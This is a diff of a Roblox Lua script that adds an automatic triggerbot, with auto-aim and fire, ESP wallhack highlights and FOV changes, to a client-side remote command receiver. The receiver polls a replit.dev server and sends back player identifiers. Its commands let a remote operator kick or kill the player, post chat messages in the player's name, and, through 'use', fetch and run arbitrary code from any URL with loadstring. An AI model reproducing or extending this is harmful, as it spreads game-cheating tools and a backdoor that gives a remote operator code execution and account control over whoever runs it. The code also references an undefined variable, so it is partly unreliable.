@@ -1,23 +1,17 @@
---==============================================================================
---|| CONFIGURATION
---==============================================================================
+-- ==============================================================================
+-- CLIENT RECEIVER + GUI-LESS TRIGGERBOT (USER SIDE)
+-- Communicates with admin panel via HTTP
+-- ==============================================================================
+
 -- [!] CONFIGURE THESE URLS TO MATCH YOUR WEB SERVER
 local SERVER_READ_URL  = "https://8775b734-9c08-4b7f-932a-e8df8538b275-00-1xt67y1hms2uu.kirk.replit.dev/read"
 local SERVER_SEND_URL  = "https://8775b734-9c08-4b7f-932a-e8df8538b275-00-1xt67y1hms2uu.kirk.replit.dev/send"
-
--- [!] SCRIPT SOURCE URLS
-local SCRIPT_SOURCES = {
-	sv_triggerbot = "https://raw.githubusercontent.com/Mr-Dark-v2/SV/refs/heads/main/admin%20sv%20triggerbot",
-	normal_triggerbot = "https://raw.githubusercontent.com/Mr-Dark-v2/SV/refs/heads/main/admin%20triggerbot"
-}
 
 -- [!] TIMING CONFIGURATION
 local HEARTBEAT_INTERVAL = 3
 local POLL_INTERVAL = 0.3
 
---==============================================================================
---|| SERVICES
---==============================================================================
+-- Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
@@ -29,26 +23,392 @@ local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local Debris = game:GetService("Debris")
 local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Camera = workspace.CurrentCamera
+local gameDefaultFOV = Camera.FieldOfView
 
---==============================================================================
---|| STATE & HELPERS
---==============================================================================
+-- State
 local lastCount = 0
-local activeLocalConnections = {}
 local gameName = "Unknown Game"
-local runningScripts = {} -- NEW: Table to track which scripts are active
+local hasTriggerbot = false
 
-local function safeHttpGet(url) local ok, res = pcall(function() return game:HttpGet(url) end); if ok and res then return true, res end; return false, res end
-local function safeJsonDecode(s) local ok, res = pcall(function() return HttpService:JSONDecode(s) end); if ok then return res end; return nil end
+-- Helpers
+local function safeHttpGet(url)
+	local ok, res = pcall(function() return game:HttpGet(url) end)
+	if ok and res then return true, res end
+	return false, res
+end
 
+local function safeJsonDecode(s)
+	local ok, res = pcall(function() return HttpService:JSONDecode(s) end)
+	if ok then return res end
+	return nil
+end
+
+local function sendMessageToServer(payloadTable)
+	task.spawn(function()
+		local ok, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payloadTable)
+		if ok then
+			pcall(function()
+				game:HttpGet(SERVER_SEND_URL .. "?text=" .. HttpService:UrlEncode(jsonPayload))
+			end)
+		end
+	end)
+end
+
+-- Fetch game name
 task.spawn(function()
 	local success, result = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
-	if success and result and result.Name then gameName = result.Name end
+	if success and result and result.Name then
+		gameName = result.Name
+	end
 end)
 
---==============================================================================
---|| COMMAND ACTIONS
---==============================================================================
+-- ==============================================================================
+-- TRIGGERBOT CORE (NO GUI)
+-- ==============================================================================
+local isAutoTargetEnabled = true
+local isESPEnabled = false
+local targetingFOV = 35
+local isFOVChangerEnabled = false
+local currentCameraFOV = 115
+local showFovToUser = false
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local backpack = LocalPlayer:WaitForChild("Backpack")
+local currentTool = nil
+local activatedConnection = nil
+local lastShotTime = 0
+local COOLDOWN = 0.5
+local currentEffectiveCooldown = 0
+local fovCircle = nil
+local Storage = Instance.new("Folder", CoreGui)
+Storage.Name = "Triggerbot_Storage"
+
+-- Drawing circle
+local function createDrawingCircle()
+	if not pcall(function() local _ = Drawing.new end) then return nil end
+	local circle = Drawing.new("Circle")
+	circle.Thickness = 2
+	circle.Color = Color3.fromRGB(128, 0, 128)
+	circle.Transparency = 0.5
+	circle.Filled = false
+	circle.NumSides = 64
+	circle.Visible = false
+	return circle
+end
+
+local function updateFOVCircle()
+	if not fovCircle then return end
+	fovCircle.Visible = isAutoTargetEnabled and showFovToUser
+	if not fovCircle.Visible then return end
+
+	local screenSize = Camera.ViewportSize
+	if screenSize.X == 0 or screenSize.Y == 0 then fovCircle.Visible = false; return end
+
+	local fovRad = math.rad(targetingFOV / 2)
+	local camFovRad = math.rad(Camera.FieldOfView / 2)
+	if fovRad <= 0 or camFovRad <= 0 or math.tan(camFovRad) == 0 then fovCircle.Visible = false; return end
+
+	local radius = (screenSize.Y / 2) * math.tan(fovRad) / math.tan(camFovRad)
+	fovCircle.Radius = math.max(0, radius)
+	fovCircle.Position = screenSize / 2
+end
+
+-- ESP
+local function applyHighlight(plr)
+	if plr == LocalPlayer then return end
+	local existing = Storage:FindFirstChild(plr.Name)
+	if existing then existing:Destroy() end
+
+	local highlight = Instance.new("Highlight", Storage)
+	highlight.Name = plr.Name
+	highlight.FillColor = plr.Team and plr.Team.TeamColor.Color or Color3.fromRGB(255, 255, 255)
+	highlight.FillTransparency = 0.5
+	highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+	highlight.OutlineTransparency = 0
+	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+	highlight.Enabled = isESPEnabled
+	if plr.Character then highlight.Adornee = plr.Character end
+
+	plr.CharacterAdded:Connect(function(char) if highlight and highlight.Parent then highlight.Adornee = char end end)
+	plr.CharacterRemoving:Connect(function() if highlight and highlight.Parent then highlight.Adornee = nil end end)
+end
+
+local function removeHighlight(plr)
+	if plr then
+		local existing = Storage:FindFirstChild(plr.Name)
+		if existing then existing:Destroy() end
+	end
+end
+
+local function toggleESP(enabled)
+	isESPEnabled = enabled
+	if enabled then
+		for _, plr in pairs(Players:GetPlayers()) do
+			if plr ~= LocalPlayer then
+				local h = Storage:FindFirstChild(plr.Name)
+				if h then h.Enabled = true else applyHighlight(plr) end
+			end
+		end
+	else
+		for _, highlight in pairs(Storage:GetChildren()) do
+			if highlight:IsA("Highlight") then highlight.Enabled = false end
+		end
+	end
+end
+
+-- Tool & Shooting
+local function findTool()
+	if character then for _, child in pairs(character:GetChildren()) do if child:IsA("Tool") then return child end end end
+	if backpack then for _, child in pairs(backpack:GetChildren()) do if child:IsA("Tool") then return child end end end
+	return nil
+end
+
+local function calculateEffectiveCooldown(toolInstance)
+	if not toolInstance or not toolInstance:IsA("Tool") then return COOLDOWN end
+	local gameCooldown = toolInstance:GetAttribute("Cooldown")
+	return (type(gameCooldown) == "number" and gameCooldown > 0) and gameCooldown or COOLDOWN
+end
+
+local function setupToolListener(toolInstance)
+	if activatedConnection then activatedConnection:Disconnect(); activatedConnection = nil end
+	currentTool = toolInstance
+	if toolInstance and toolInstance:IsA("Tool") then
+		local cooldownActive = currentEffectiveCooldown > 0 and (tick() - lastShotTime < currentEffectiveCooldown)
+		pcall(function() toolInstance.Enabled = not cooldownActive end)
+		activatedConnection = toolInstance.Activated:Connect(function()
+			lastShotTime = tick()
+			currentEffectiveCooldown = calculateEffectiveCooldown(toolInstance)
+			if toolInstance then pcall(function() toolInstance.Enabled = false end) end
+		end)
+	else
+		currentEffectiveCooldown = 0
+	end
+end
+
+local function getShootEvent()
+	local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+	return remotes and remotes:FindFirstChild("ShootGun")
+end
+
+local function isVisible(targetCharacter)
+	if not character or not character:FindFirstChild("HumanoidRootPart") then return nil end
+	local startPos = character.HumanoidRootPart.Position
+	local priorityParts = {"HumanoidRootPart", "LeftHand", "RightHand", "LeftFoot", "RightFoot"}
+	local lastResortPart = "Head"
+	local raycastParams = RaycastParams.new()
+	raycastParams.FilterDescendantsInstances = {character, Storage}
+	raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
+	raycastParams.IgnoreWater = true
+
+	for _, partName in pairs(priorityParts) do
+		local targetPart = targetCharacter:FindFirstChild(partName)
+		if targetPart and targetPart:IsA("BasePart") then
+			local targetPos = targetPart.Position
+			local direction = targetPos - startPos
+			local distance = direction.Magnitude
+			if distance > 0.1 then
+				local rayResult = workspace:Raycast(startPos, direction.Unit * distance, raycastParams)
+				if rayResult and rayResult.Instance:IsDescendantOf(targetCharacter) then
+					return targetPart
+				end
+			end
+		end
+	end
+
+	local headPart = targetCharacter:FindFirstChild(lastResortPart)
+	if headPart and headPart:IsA("BasePart") then
+		local targetPos = headPart.Position
+		local direction = targetPos - startPos
+		local distance = direction.Magnitude
+		if distance > 0.1 then
+			local rayResult = workspace:Raycast(startPos, direction.Unit * distance, raycastParams)
+			if rayResult and rayResult.Instance:IsDescendantOf(targetCharacter) then
+				return headPart
+			end
+		end
+	end
+	return nil
+end
+
+local function isWithinFOV(targetPart)
+	if not character or not character:FindFirstChild("HumanoidRootPart") then return false end
+	local cameraCFrame = Camera.CFrame
+	local targetPos = targetPart.Position
+	local cameraPos = cameraCFrame.Position
+	if (targetPos - cameraPos).Magnitude < 0.1 then return true end
+	local directionToTarget = (targetPos - cameraPos).Unit
+	local cameraLook = cameraCFrame.LookVector
+	local dot = math.clamp(directionToTarget:Dot(cameraLook), -1, 1)
+	local angle = math.deg(math.acos(dot))
+	return angle <= (targetingFOV / 2)
+end
+
+local function findClosestEnemy()
+	local maxDistance = 400
+	local closestEnemy = nil
+	local closestVisiblePart = nil
+	local closestDistance = maxDistance
+	local playerRootPart = character and character:FindFirstChild("HumanoidRootPart")
+	if not playerRootPart then return nil, nil end
+	local playerRootPos = playerRootPart.Position
+	local myTeam = LocalPlayer.Team
+	if not myTeam then return nil, nil end
+
+	for _, targetPlayer in pairs(Players:GetPlayers()) do
+		if targetPlayer ~= LocalPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
+			local targetChar = targetPlayer.Character
+			local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
+			local targetTeam = targetPlayer.Team
+			local isActualOpponent = false
+			if targetTeam then
+				if myTeam.Name == "Team1" and targetTeam.Name == "Team2" then isActualOpponent = true
+				elseif myTeam.Name == "Team2" and targetTeam.Name == "Team1" then isActualOpponent = true
+				end
+			end
+			if targetHumanoid.Health > 0 and isActualOpponent then
+				local distance = (playerRootPos - targetRoot.Position).Magnitude
+				if distance < closestDistance then
+					local visiblePart = isVisible(targetChar)
+					if visiblePart and isWithinFOV(targetRoot) then
+						closestDistance = distance
+						closestEnemy = targetPlayer
+						closestVisiblePart = visiblePart
+					end
+				end
+			end
+		end
+	end
+	return closestEnemy, closestVisiblePart
+end
+
+local function shoot()
+	if not isAutoTargetEnabled then return end
+	if not character or not character.Parent then return end
+	if not character:FindFirstChild("HumanoidRootPart") then return end
+
+	local tool = currentTool
+	if not tool or tool.Parent ~= character then
+		tool = findTool()
+		if tool and tool.Parent == character then setupToolListener(tool) else return end
+	end
+
+	local shootEvent = getShootEvent()
+	if not shootEvent then return end
+
+	local effectiveCooldown = calculateEffectiveCooldown(tool)
+	local currentTime = tick()
+	if currentTime - lastShotTime < effectiveCooldown then return end
+
+	local targetEnemy, visiblePart = findClosestEnemy()
+	if not visiblePart or not targetEnemy or not targetEnemy.Character then return end
+
+	lastShotTime = currentTime
+	currentEffectiveCooldown = effectiveCooldown
+
+	local toolAtDecision = tool
+	local fireSoundAtDecision = tool:FindFirstChild("Fire")
+	local startPosAtDecision
+	local muzzleAttach = tool:FindFirstChild("Muzzle", true)
+	if muzzleAttach and muzzleAttach:IsA("Attachment") then
+		startPosAtDecision = muzzleAttach.WorldPosition
+	else
+		local handle = tool:FindFirstChild("Handle")
+		startPosAtDecision = (handle and handle:IsA("BasePart") and handle.Position) or character.HumanoidRootPart.Position
+	end
+	local visiblePartAtDecision = visiblePart
+
+	task.spawn(function()
+		if not toolAtDecision or toolAtDecision.Parent ~= character then return end
+		if not targetEnemy or not targetEnemy.Parent or not targetEnemy.Character or not targetEnemy.Character.Parent then return end
+		local targetHumanoid = targetEnemy.Character:FindFirstChildOfClass("Humanoid")
+		if not targetHumanoid or targetHumanoid.Health <= 0 then return end
+
+		local actualImpactPoint = visiblePartAtDecision.Position
+		local successFire = pcall(function()
+			shootEvent:FireServer(startPosAtDecision, actualImpactPoint, visiblePartAtDecision, actualImpactPoint)
+		end)
+
+		if successFire then
+			if fireSoundAtDecision and fireSoundAtDecision:IsA("Sound") then
+				pcall(function() fireSoundAtDecision:Play() end)
+			end
+			pcall(function() toolAtDecision:Activate() end)
+			task.wait()
+			if toolAtDecision and toolAtDecision.Parent == character then
+				pcall(function() toolAtDecision.Enabled = false end)
+			end
+		end
+	end)
+end
+
+-- Initialize Triggerbot
+local function initTriggerbot()
+	if hasTriggerbot then return end
+	hasTriggerbot = true
+
+	fovCircle = createDrawingCircle()
+	Camera.FieldOfView = isFOVChangerEnabled and currentCameraFOV or gameDefaultFOV
+	toggleESP(isESPEnabled)
+	updateFOVCircle()
+
+	-- Notify admin panel
+	sendMessageToServer({
+		cmd = "triggerbot_ready",
+		userId = LocalPlayer.UserId,
+		status = "active"
+	})
+
+	-- Listeners
+	LocalPlayer.CharacterAdded:Connect(function(newChar)
+		character = newChar
+		task.wait(0.2)
+		backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
+		setupToolListener(findTool())
+	end)
+
+	Players.PlayerAdded:Connect(function(newPlayer)
+		if newPlayer ~= LocalPlayer and isESPEnabled then
+			applyHighlight(newPlayer)
+		end
+	end)
+
+	Players.PlayerRemoving:Connect(function(leavingPlayer)
+		removeHighlight(leavingPlayer)
+	end)
+
+	for _, existingPlayer in pairs(Players:GetPlayers()) do
+		if existingPlayer ~= LocalPlayer and isESPEnabled then
+			applyHighlight(existingPlayer)
+		end
+	end
+
+	RunService.RenderStepped:Connect(function()
+		if not character or not character.Parent then
+			character = LocalPlayer.Character
+			if not character then return end
+		end
+
+		local currentlyEquippedTool = character:FindFirstChildOfClass("Tool")
+		if currentlyEquippedTool ~= currentTool then
+			setupToolListener(currentlyEquippedTool)
+		end
+
+		if currentTool and not currentTool.Enabled and currentEffectiveCooldown > 0 then
+			if tick() - lastShotTime >= currentEffectiveCooldown then
+				pcall(function() currentTool.Enabled = true end)
+				currentEffectiveCooldown = 0
+			end
+		end
+
+		pcall(updateFOVCircle)
+		pcall(shoot)
+	end)
+end
+
+-- ==============================================================================
+-- COMMAND ACTIONS (including triggerbot control)
+-- ==============================================================================
 local Commands = {
 	["rejoin"] = function()
 		pcall(function()
@@ -56,26 +416,18 @@ local Commands = {
 			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
 		end)
 	end,
-
 	["joinme"] = function(args)
 		local jobId = args and args[1]
 		if jobId and jobId ~= "" then
 			pcall(TeleportService.TeleportToPlaceInstance, TeleportService, game.PlaceId, jobId, LocalPlayer)
 		end
 	end,
-
 	["blockchat"] = function()
-		pcall(function()
-			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-		end)
+		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
 	end,
-
 	["unblockchat"] = function()
-		pcall(function()
-			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-		end)
+		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end)
 	end,
-
 	["sendchat"] = function(args)
 		local msg = args and args[1]
 		if msg and msg ~= "" then
@@ -83,7 +435,10 @@ local Commands = {
 				local textChatService = game:GetService("TextChatService")
 				if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 					local generalChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
-					if generalChannel then generalChannel:SendAsync(msg); return end
+					if generalChannel then
+						generalChannel:SendAsync(msg)
+						return
+					end
 				end
 				local sayMessageRequest = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
 				if sayMessageRequest then sayMessageRequest = sayMessageRequest:FindFirstChild("SayMessageRequest") end
@@ -91,48 +446,45 @@ local Commands = {
 			end)
 		end
 	end,
-
 	["kill"] = function()
 		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
 			LocalPlayer.Character.Humanoid.Health = 0
 		end
 	end,
-
 	["kick"] = function(args)
 		local message = (args and args[1]) or "Kicked by Admin"
 		pcall(function() LocalPlayer:Kick(message) end)
 	end,
-
 	["freeze"] = function()
 		if LocalPlayer.Character then
 			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
-				if part:IsA("BasePart") then pcall(function() part.Anchored = true end) end
+				if part:IsA("BasePart") then
+					pcall(function() part.Anchored = true end)
+				end
 			end
 		end
 	end,
-
 	["unfreeze"] = function()
 		if LocalPlayer.Character then
 			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
-				if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
+				if part:IsA("BasePart") then
+					pcall(function() part.Anchored = false end)
+				end
 			end
 		end
 	end,
-
 	["stopgame"] = function()
 		if CoreGui:FindFirstChild("StopGameOverlay") then return end
-		local overlay = Instance.new("ScreenGui"); overlay.Name = "StopGameOverlay"; overlay.ResetOnSpawn = false; overlay.IgnoreGuiInset = true; overlay.Parent = CoreGui
-		local block = Instance.new("Frame", overlay); block.Size = UDim2.new(2, 0, 2, 0); block.Position = UDim2.new(-0.5, 0, -0.5, 0); block.BackgroundTransparency = 1; block.Active = true; block.ZIndex = 9e9
+		local overlay = Instance.new("ScreenGui")
+		overlay.Name = "StopGameOverlay"; overlay.ResetOnSpawn = false; overlay.IgnoreGuiInset = true; overlay.Parent = CoreGui
+		local block = Instance.new("Frame", overlay)
+		block.Size = UDim2.new(2, 0, 2, 0); block.Position = UDim2.new(-0.5, 0, -0.5, 0); block.BackgroundTransparency = 1; block.Active = true; block.ZIndex = 9e9
 		pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
-		activeLocalConnections["StopGame"] = UserInputService.InputBegan:Connect(function() end)
 	end,
-
 	["resumegame"] = function()
 		if CoreGui:FindFirstChild("StopGameOverlay") then CoreGui.StopGameOverlay:Destroy() end
-		if activeLocalConnections["StopGame"] then activeLocalConnections["StopGame"]:Disconnect(); activeLocalConnections["StopGame"] = nil end
 		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
 	end,
-
 	["jail"] = function()
 		if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
 			local jailName = "TheBox_" .. LocalPlayer.UserId
@@ -144,12 +496,10 @@ local Commands = {
 			hrp.CFrame = CFrame.new(pos)
 		end
 	end,
-
 	["unjail"] = function()
 		local jailName = "TheBox_" .. LocalPlayer.UserId
 		if workspace:FindFirstChild(jailName) then workspace[jailName]:Destroy() end
 	end,
-
 	["kidnap"] = function()
 		if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
 			local vanName = "UnmarkedVan_" .. LocalPlayer.UserId
@@ -164,7 +514,6 @@ local Commands = {
 			Debris:AddItem(van, 4)
 		end
 	end,
-
 	["um"] = function(args)
 		local msg = args and args[1] or "Message"; local dur = (args and tonumber(args[2])) or 5
 		local gui = Instance.new("ScreenGui"); gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true; gui.Parent = CoreGui
@@ -174,96 +523,56 @@ local Commands = {
 		for t=0,1,0.1 do lbl.TextTransparency = t; task.wait(0.03) end
 		gui:Destroy()
 	end,
-
 	["use"] = function(args)
 		local url = args and args[1]
 		if not url or url == "" then return end
 		local ok, src = pcall(function() return game:HttpGet(url) end)
-		if ok and src then local func, err = loadstring(src); if func then pcall(func) end end
-	end,
-
-	--==============================================================================
-	--|| NEW SCRIPT MANAGEMENT COMMANDS
-	--==============================================================================
-
-	["deactivate_script"] = function(args)
-		local scriptName = args and args[1]
-		if not scriptName or not runningScripts[scriptName] then return end
-
-		if scriptName == "sv_triggerbot" and _G.SV_API and _G.SV_API.Deactivate then
-			pcall(_G.SV_API.Deactivate)
-			_G.SV_API = nil
-		elseif scriptName == "normal_triggerbot" and _G.NormalTriggerbot_API and _G.NormalTriggerbot_API.Deactivate then
-			pcall(_G.NormalTriggerbot_API.Deactivate)
-			_G.NormalTriggerbot_API = nil
-		end
-		
-		runningScripts[scriptName] = nil
-		print("[Client Receiver] Deactivated: " .. scriptName)
-	end,
-
-	["execute_script"] = function(args)
-		local scriptName = args and args[1]
-		if not scriptName or not SCRIPT_SOURCES[scriptName] then return end
-
-		if runningScripts[scriptName] then
-			Commands.deactivate_script({scriptName})
-			task.wait(0.5)
-		end
-
-		local scriptUrl = SCRIPT_SOURCES[scriptName]
-		print("[Client Receiver] Executing: " .. scriptName)
-		
-		local success, scriptContent = safeHttpGet(scriptUrl)
-		if success and scriptContent then
-			local func, err = loadstring(scriptContent)
-			if func then
-				local successCall, errCall = pcall(func)
-				if successCall then
-					runningScripts[scriptName] = true
-					print("[Client Receiver] Successfully executed: " .. scriptName)
-				else
-					warn("[Client Receiver] Error during execution of " .. scriptName .. ": ", errCall)
-				end
+		if ok and src then
+			if url:find("triggerbot") then
+				initTriggerbot()
 			else
-				warn("[Client Receiver] Error loading " .. scriptName .. " from source: ", err)
+				local func, err = loadstring(src)
+				if func then pcall(func) end
 			end
-		else
-			warn("[Client Receiver] Failed to download script content for: " .. scriptName)
 		end
 	end,
+	-- TRIGGERBOT CONTROL COMMANDS
+	["triggerbot_set"] = function(args)
+		if not hasTriggerbot then return end
+		local setting = args and args[1]
+		local value = args and args[2]
 
-	["script_command"] = function(args)
-		if not args or #args < 2 then return end
-		
-		local scriptName = table.remove(args, 1)
-		local funcName = table.remove(args, 1)
-		
-		if not runningScripts[scriptName] then return end
+		if setting == "auto_target" then
+			isAutoTargetEnabled = value
+		elseif setting == "esp" then
+			toggleESP(value)
+		elseif setting == "target_fov" then
+			targetingFOV = math.clamp(tonumber(value) or 35, 0, 180)
+		elseif setting == "fov_changer" then
+			isFOVChangerEnabled = value
+			if isFOVChangerEnabled then
+				Camera.FieldOfView = currentCameraFOV
+			else
+				Camera.FieldOfView = gameDefaultFOV
+			end
+		elseif setting == "camera_fov" then
+			currentCameraFOV = math.clamp(tonumber(value) or 115, 30, 120)
+			if isFOVChangerEnabled then
+				Camera.FieldOfView = currentCameraFOV
+			end
+		elseif setting == "show_fov_to_user" then
+			showFovToUser = value
+		end
 
-		local apiTable = nil
-		if scriptName == "sv_triggerbot" then
-			apiTable = _G.SV_API
-		elseif scriptName == "normal_triggerbot" then
-			apiTable = _G.NormalTriggerbot_API
-		end
-		
-		if apiTable and type(apiTable[funcName]) == "function" then
-			pcall(apiTable[funcName], apiTable, unpack(args))
-		end
+		updateFOVCircle()
 	end
 }
 
---==============================================================================
---|| HEARTBEAT SENDER
---==============================================================================
+-- ==============================================================================
+-- HEARTBEAT + COMMAND LISTENER
+-- ==============================================================================
 task.spawn(function()
 	while true do
-		local runningScriptsList = {}
-		for name, _ in pairs(runningScripts) do
-			table.insert(runningScriptsList, name)
-		end
-		
 		local payload = {
 			userId = LocalPlayer.UserId,
 			name = LocalPlayer.Name,
@@ -271,19 +580,28 @@ task.spawn(function()
 			jobId = game.JobId,
 			ts = os.time(),
 			gameName = gameName,
-			running_scripts = runningScriptsList
+			hasTriggerbot = hasTriggerbot
 		}
-		
 		local ok, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payload)
-		if ok then pcall(function() game:HttpGet(SERVER_SEND_URL .. "?text=" .. HttpService:UrlEncode(jsonPayload)) end) end
+		if ok then
+			pcall(function()
+				game:HttpGet(SERVER_SEND_URL .. "?text=" .. HttpService:UrlEncode(jsonPayload))
+			end)
+		end
 		task.wait(HEARTBEAT_INTERVAL)
 	end
 end)
 
---==============================================================================
---|| COMMAND LISTENER
---==============================================================================
-pcall(function() local ok, resp = safeHttpGet(SERVER_READ_URL); if ok then local dec = safeJsonDecode(resp); if type(dec) == "table" then lastCount = #dec end end end)
+pcall(function()
+	local ok, resp = safeHttpGet(SERVER_READ_URL)
+	if ok then
+		local dec = safeJsonDecode(resp)
+		if type(dec) == "table" then
+			lastCount = #dec
+		end
+	end
+end)
+
 task.spawn(function()
 	while true do
 		local ok, resp = safeHttpGet(SERVER_READ_URL)
@@ -293,11 +611,9 @@ task.spawn(function()
 				for idx = lastCount + 1, #data do
 					local cmdData = safeJsonDecode(data[idx] or "")
 					if type(cmdData) == "table" and cmdData.cmd and cmdData.target then
-						if cmdData.target == LocalPlayer.UserId or cmdData.target == "all" then
-							local commandFunc = Commands[cmdData.cmd:lower()]
-							if commandFunc then
-								pcall(commandFunc, cmdData.args)
-							end
+						local commandFunc = Commands[cmdData.cmd:lower()]
+						if commandFunc and (cmdData.target == LocalPlayer.UserId or cmdData.target == "all") then
+							pcall(commandFunc, cmdData.args)
 						end
 					end
 				end
@@ -307,3 +623,16 @@ task.spawn(function()
 		task.wait(POLL_INTERVAL)
 	end
 end)
+
+-- Cleanup
+if script and script:IsA("Script") then
+	script.Destroying:Connect(function()
+		if activatedConnection then activatedConnection:Disconnect() end
+		if fovCircle and fovCircle.Destroy then fovCircle:Destroy() end
+		if Storage and Storage.Parent then Storage:Destroy() end
+		if currentTool and currentTool.Parent and not currentTool.Enabled then
+			pcall(function() currentTool.Enabled = true end)
+		end
+		Camera.FieldOfView = gameDefaultFOV
+	end)
+end
